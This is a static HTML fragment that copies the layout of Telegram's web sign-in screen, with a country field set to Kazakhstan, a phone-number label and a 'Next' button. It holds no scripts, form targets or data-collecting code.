<body class="non_osx non_msie is_2x">
    <div class="page_wrap">
        <div class="login_page_wrap">
            <div class="login_head_bg"></div>
            <div class="login_page">
                <div class="login_head_wrap clearfix">
                    <div class="login_head_submit_wrap">
                        <a class="login_head_submit_btn">
                            <p>Next</p>
                        </a>
                    </div>
                    <a class="login_head_logo_link" href="https://telegram.org" target="_blank">
                        <i class="icon icon-tg-logo"></i>
                        <i class="icon icon-tg-title"></i>
                    </a>
                </div>
                <div class="login_form_wrap">
                    <form name="mySendCodeForm" class="ng-pristine ng-invalid ng-invalid-required">
                        <h3 class="login_form_head"> Sign in</h3>
                        <p class="login_form_lead"> Please choose your country and enter your full phone number.</p>
                        <div class="md-input-group md-input-has-value login_phone_country_input_group">
                            <label class="md-input-label"> Country</label>
                            <div class="md-input">Kazakhstan</div>
                        </div>
                        <div class="login_phone_groups_wrap clearfix">
                            <div
                                class="md-input-group login_phone_code_input_group md-input-has-value md-input-animated">
                                <label class="md-input-label"> Phone number</label>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
